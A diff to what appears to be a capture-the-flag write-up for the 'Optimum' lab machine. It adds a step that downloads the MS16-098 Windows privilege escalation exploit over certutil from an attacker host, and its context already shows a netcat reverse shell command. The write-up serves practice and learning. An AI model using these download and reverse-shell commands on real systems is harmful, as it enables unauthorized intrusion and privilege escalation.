@@ -55,4 +55,18 @@ certutil -urlcache -split -f "http://10.10.14.3/nc.exe" nc.exe
 ```
 Finally, I ran the netcat with: ```nc.exe 10.10.14.3 4444 -e cmd.exe``` </br> </br>
 <img src="images/optimum/netcat_shell.png" alt="netcat_shell" width="700" height="200"/> </br> </br>
+Downloaded the MS16-098 Exploit from [Exploit-DB](https://www.exploit-db.com/exploits/41020), And transferred it to the Windows
+Machine with certutil: </br>
+```bash
+certutil -urlcache -split -f "http://10.10.14.3/privesc.exe" privesc.exe
+``` 
+</br>
+**Vulnerability Explanation:** The kernel-mode drivers in Microsoft Windows Vista SP2; Windows Server
+2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT
+8.1; and Windows 10 Gold, 1511, and 1607 allow local users to gain privileges via a crafted application,
+aka "Win32k Elevation of Privilege Vulnerability". </br>
+**Proof Of Screenshot:** </br>
+![privesc_poc](privesc_poc.png)
+
+
 
